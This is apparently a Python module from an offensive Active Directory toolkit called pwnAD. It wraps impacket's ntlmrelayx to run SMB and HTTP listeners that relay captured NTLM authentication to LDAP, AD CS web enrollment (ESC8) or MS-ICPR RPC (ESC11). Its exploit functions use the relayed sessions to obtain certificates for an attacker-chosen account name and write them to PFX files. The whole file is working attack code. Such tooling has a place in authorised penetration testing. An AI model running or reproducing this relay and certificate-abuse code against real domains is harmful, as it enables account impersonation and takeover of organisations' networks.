"""
NTLM Relay server integration for pwnAD.

Provides:
  - SMB/HTTP listener that relays NTLM auth to LDAP, HTTP (ESC8), or RPC (ESC11)
  - Custom attack classes that inject relayed sessions into pwnAD
  - Callback-based session delivery for interactive/web use
"""
import logging
import queue

from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
from impacket.examples.ntlmrelayx.servers.httprelayserver import HTTPRelayServer
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor


# ---------------------------------------------------------------------------
# Custom attack classes — instead of running a predefined attack, these
# push the relayed session into a queue that pwnAD consumes.
# ---------------------------------------------------------------------------

class PwnADLDAPAttack(ProtocolAttack):
    """Receives a relayed LDAP session and pushes it to the relay manager."""
    PLUGIN_NAMES = ['LDAP', 'LDAPS']

    def run(self):
        session_info = {
            'type': 'ldap',
            'client': self.client,
            'username': self.username,
            'domain': self.domain,
            'target': self.target,
        }
        if hasattr(self.config, '_pwnAD_session_queue'):
            self.config._pwnAD_session_queue.put(session_info)
            logging.info(f'[+] Relay: LDAP session for {self.domain}\\{self.username} queued')


class PwnADHTTPAttack(ProtocolAttack):
    """Receives a relayed HTTP session (ESC8) and pushes it to the relay manager."""
    PLUGIN_NAMES = ['HTTP', 'HTTPS']

    def run(self):
        session_info = {
            'type': 'http',
            'client': self.client,
            'username': self.username,
            'domain': self.domain,
            'target': self.target,
        }
        if hasattr(self.config, '_pwnAD_session_queue'):
            self.config._pwnAD_session_queue.put(session_info)
            logging.info(f'[+] Relay: HTTP session for {self.domain}\\{self.username} queued')


class PwnADRPCAttack(ProtocolAttack):
    """Receives a relayed DCE/RPC session (ESC11) and pushes it to the relay manager."""
    PLUGIN_NAMES = ['RPC']

    def __init__(self, config, dce, username, target=None, relay_client=None):
        ProtocolAttack.__init__(self, config, dce, username, target, relay_client)
        self.dce = dce

    def run(self):
        session_info = {
            'type': 'rpc',
            'dce': self.dce,
            'client': self.client,
            'username': self.username,
            'domain': self.domain,
            'target': self.target,
        }
        if hasattr(self.config, '_pwnAD_session_queue'):
            self.config._pwnAD_session_queue.put(session_info)
            logging.info(f'[+] Relay: RPC session for {self.domain}\\{self.username} queued')


# ---------------------------------------------------------------------------
# Protocol client registry — maps scheme → client class
# ---------------------------------------------------------------------------

def _get_protocol_clients():
    """Build the protocol client dict from impacket's relay clients."""
    from impacket.examples.ntlmrelayx.clients.ldaprelayclient import LDAPRelayClient, LDAPSRelayClient
    from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient, HTTPSRelayClient
    from impacket.examples.ntlmrelayx.clients.rpcrelayclient import RPCRelayClient

    return {
        'LDAP': LDAPRelayClient,
        'LDAPS': LDAPSRelayClient,
        'HTTP': HTTPRelayClient,
        'HTTPS': HTTPSRelayClient,
        'RPC': RPCRelayClient,
    }


# ---------------------------------------------------------------------------
# Relay Manager — orchestrates the relay server lifecycle
# ---------------------------------------------------------------------------

class RelayManager:
    """Manages relay servers and distributes relayed sessions to pwnAD.

    Usage:
        manager = RelayManager(
            target='ldaps://dc01.domain.local',
            listen_host='0.0.0.0',
            smb_port=445,
            http_port=80,
        )
        manager.start()

        # Block until a session arrives (or poll with timeout)
        session = manager.get_session(timeout=None)
        # session['type'] == 'ldap' → session['client'] is ldap3.Connection
    """

    def __init__(
        self,
        target,
        listen_host='0.0.0.0',
        smb_port=445,
        http_port=80,
        disable_smb=False,
        disable_http=False,
        domain=None,
        adcs_template=None,
        adcs_ca=None,
        adcs_alt_name=None,
    ):
        self.target = target
        self.listen_host = listen_host
        self.smb_port = smb_port
        self.http_port = http_port
        self.disable_smb = disable_smb
        self.disable_http = disable_http
        self.domain = domain
        self._session_queue = queue.Queue()
        self._servers = []
        self._running = False

        # Build config
        self._config = NTLMRelayxConfig()
        self._config.setInterfaceIp(listen_host)
        self._config.setListeningPort(smb_port)
        self._config.setSMB2Support(True)
        self._config.setMode('RELAY')
        self._config.setDisableMulti(False)

        # ADCS options (for ESC8/ESC11 auto-exploit)
        if adcs_template:
            self._config.setIsADCSAttack(True)
            self._config.template = adcs_template
        if adcs_alt_name:
            self._config.setAltName(adcs_alt_name)
        if adcs_ca:
            self._config.icpr_ca_name = adcs_ca

        # Attach session queue to config so attack classes can access it
        self._config._pwnAD_session_queue = self._session_queue

        # Protocol clients
        proto_clients = _get_protocol_clients()
        self._config.setProtocolClients(proto_clients)

        # Targets
        targets = TargetsProcessor(
            singleTarget=target,
            protocolClients=proto_clients,
        )
        self._config.setTargets(targets)

        # Attack classes
        attacks = {}
        target_scheme = target.split('://')[0].upper() if '://' in target else 'LDAP'
        if target_scheme in ('LDAP', 'LDAPS'):
            for name in PwnADLDAPAttack.PLUGIN_NAMES:
                attacks[name] = PwnADLDAPAttack
        elif target_scheme in ('HTTP', 'HTTPS'):
            for name in PwnADHTTPAttack.PLUGIN_NAMES:
                attacks[name] = PwnADHTTPAttack
        elif target_scheme == 'RPC':
            for name in PwnADRPCAttack.PLUGIN_NAMES:
                attacks[name] = PwnADRPCAttack
        self._config.setAttacks(attacks)

    def start(self):
        """Start relay servers in background threads."""
        if self._running:
            return

        self._running = True
        logging.info(f'[*] Relay: target = {self.target}')

        if not self.disable_smb:
            try:
                smb_server = SMBRelayServer(self._config)
                smb_server.daemon = True
                smb_server.start()
                self._servers.append(smb_server)
                logging.info(f'[*] Relay: SMB server listening on {self.listen_host}:{self.smb_port}')
            except Exception as e:
                logging.warning(f'[!] Relay: Failed to start SMB server: {e}')

        if not self.disable_http:
            try:
                self._config.setListeningPort(self.http_port)
                http_server = HTTPRelayServer(self._config)
                http_server.daemon = True
                http_server.start()
                self._servers.append(http_server)
                logging.info(f'[*] Relay: HTTP server listening on {self.listen_host}:{self.http_port}')
            except Exception as e:
                logging.warning(f'[!] Relay: Failed to start HTTP server: {e}')

        if not self._servers:
            raise RuntimeError('No relay servers could be started')

    def stop(self):
        """Stop all relay servers."""
        self._running = False
        for server in self._servers:
            try:
                server.server.shutdown()
            except Exception:
                pass
        self._servers.clear()
        logging.info('[*] Relay: servers stopped')

    def get_session(self, timeout=None):
        """Block until a relayed session is available.

        Returns:
            dict with keys: type, client, username, domain, target
            Returns None on timeout.
        """
        try:
            return self._session_queue.get(timeout=timeout)
        except queue.Empty:
            return None

    def has_session(self):
        """Check if a session is available without blocking."""
        return not self._session_queue.empty()

    def get_all_sessions(self):
        """Drain all available sessions."""
        sessions = []
        while not self._session_queue.empty():
            try:
                sessions.append(self._session_queue.get_nowait())
            except queue.Empty:
                break
        return sessions


# ---------------------------------------------------------------------------
# ESC8 — HTTP enrollment relay exploitation
# ---------------------------------------------------------------------------

def exploit_esc8(http_session, ca_name, template=None, alt_name=None, output=None):
    """Exploit ESC8: use a relayed HTTP session to request a certificate via certsrv.

    Args:
        http_session: HTTP connection from relay (http.client.HTTPConnection-like)
        ca_name: CA common name (for display; the relay target is already the CA)
        template: Certificate template (default: Machine)
        alt_name: Alternative UPN for the SAN
        output: Output path for PFX

    Returns:
        tuple: (pfx_path, cert, key) or raises
    """
    import re
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    from pwnAD.lib.certificate import create_csr, create_pfx, generate_rsa_key, csr_to_pem

    if template is None:
        template = 'Machine'

    key = generate_rsa_key(2048)

    csr_obj, _ = create_csr(
        username='relay',
        alt_upn=alt_name.encode() if alt_name else None,
        key=key,
    )
    csr_pem = csr_to_pem(csr_obj).decode()
    csr_body = csr_pem.replace('-----BEGIN CERTIFICATE REQUEST-----', '') \
                       .replace('-----END CERTIFICATE REQUEST-----', '') \
                       .replace('\n', '')
    csr_encoded = csr_body.replace('+', '%2b').replace(' ', '+')

    cert_attrib = f'CertificateTemplate:{template}'
    if alt_name:
        cert_attrib += f'%0d%0aSAN:upn={alt_name}'

    data = f'Mode=newreq&CertRequest={csr_encoded}&CertAttrib={cert_attrib}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint='

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(len(data)),
    }

    logging.info(f'[*] ESC8: Requesting certificate via HTTP enrollment (template: {template})')
    http_session.request('POST', '/certsrv/certfnsh.asp', body=data, headers=headers)
    response = http_session.getresponse()

    if response.status != 200:
        raise RuntimeError(f'ESC8: HTTP enrollment returned status {response.status}')

    content = response.read().decode(errors='replace')
    logging.debug(f'ESC8: CA response body: {content[:2000]}')
    found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content)
    if not found:
        error_match = re.search(r'<B>\s*Error[^<]*</B>[^<]*<P>\s*([^<]+)', content, re.IGNORECASE)
        error_msg = error_match.group(1).strip() if error_match else content[:500]
        raise RuntimeError(f'ESC8: Certificate request failed: {error_msg}')

    cert_id = found[0]
    logging.info(f'[+] ESC8: Certificate issued (Request ID: {cert_id})')

    http_session.request('GET', f'/certsrv/certnew.cer?ReqID={cert_id}&Enc=b64')
    cert_response = http_session.getresponse()
    cert_raw = cert_response.read()

    if not cert_raw:
        raise RuntimeError('ESC8: Empty certificate response from CA')

    logging.debug(f'ESC8: cert response Content-Type: {cert_response.getheader("Content-Type")}')
    logging.debug(f'ESC8: cert response first 100 bytes: {cert_raw[:100]}')

    import base64
    cert_text = cert_raw.decode(errors='replace')
    # Strip PEM headers if present
    pem_body = cert_text.replace('-----BEGIN CERTIFICATE-----', '') \
                        .replace('-----END CERTIFICATE-----', '') \
                        .strip()
    try:
        cert_der_data = base64.b64decode(pem_body)
    except Exception:
        cert_der_data = cert_raw

    cert = x509.load_der_x509_certificate(cert_der_data, default_backend())
    pfx_data = create_pfx(key, cert)

    if output is None:
        output = f'esc8_{alt_name or template}.pfx'

    with open(output, 'wb') as f:
        f.write(pfx_data)

    logging.info(f'[+] ESC8: PFX saved to {output}')
    return output, cert, key


# ---------------------------------------------------------------------------
# ESC11 — RPC relay to MS-ICPR exploitation
# ---------------------------------------------------------------------------

def exploit_esc11(dce, ca_name, template=None, alt_name=None, output=None):
    """Exploit ESC11: use a relayed DCE/RPC session to request a certificate via MS-ICPR.

    The DCE/RPC session must already be bound to the ICPR interface.

    Args:
        dce: Relayed DCE/RPC connection (already bound to MS-ICPR)
        ca_name: CA common name
        template: Certificate template (default: Machine)
        alt_name: Alternative UPN for the SAN
        output: Output path for PFX

    Returns:
        tuple: (pfx_path, cert, key)
    """
    from impacket.dcerpc.v5 import icpr
    from pwnAD.lib.certificate import create_csr, create_pfx, csr_to_der, der_to_cert, generate_rsa_key

    if template is None:
        template = 'Machine'

    key = generate_rsa_key(2048)
    csr, _ = create_csr(username='relay', alt_upn=alt_name.encode() if alt_name else None, key=key)
    csr_der = csr_to_der(csr)

    attr_list = [f'CertificateTemplate:{template}']
    if alt_name:
        attr_list.append(f'SAN:upn={alt_name}')

    logging.info(f'[*] ESC11: Requesting certificate via MS-ICPR relay (CA: {ca_name}, template: {template})')

    try:
        cert_der = icpr.hCertServerRequest(dce, csr_der, attr_list, ca=ca_name)
    except Exception as e:
        raise RuntimeError(f'ESC11: RPC certificate request failed: {e}')

    if not cert_der:
        raise RuntimeError('ESC11: Certificate request denied by CA (check template and permissions)')

    cert = der_to_cert(cert_der)
    pfx_data = create_pfx(key, cert)

    if output is None:
        output = f'esc11_{alt_name or template}.pfx'

    with open(output, 'wb') as f:
        f.write(pfx_data)

    logging.info(f'[+] ESC11: PFX saved to {output}')
    return output, cert, key


# ---------------------------------------------------------------------------
# High-level relay session handler
# ---------------------------------------------------------------------------

def handle_relay_session(session, domain=None):
    """Convert a relay session dict into a pwnAD LDAPConnection.

    Args:
        session: dict from RelayManager.get_session()
        domain: domain override

    Returns:
        LDAPConnection for LDAP sessions, or the raw session for HTTP/RPC
    """
    from pwnAD.lib.ldap import LDAPConnection

    if session['type'] == 'ldap':
        target = session['target']
        if hasattr(target, 'hostname'):
            target_host = target.hostname
        elif isinstance(target, str):
            target_host = target.replace('ldap://', '').replace('ldaps://', '').split('/')[0].split(':')[0]
        else:
            target_host = str(target)

        conn = LDAPConnection.from_relay(
            session['client'],
            target=target_host,
            domain=domain or session.get('domain'),
        )
        return conn

    return session
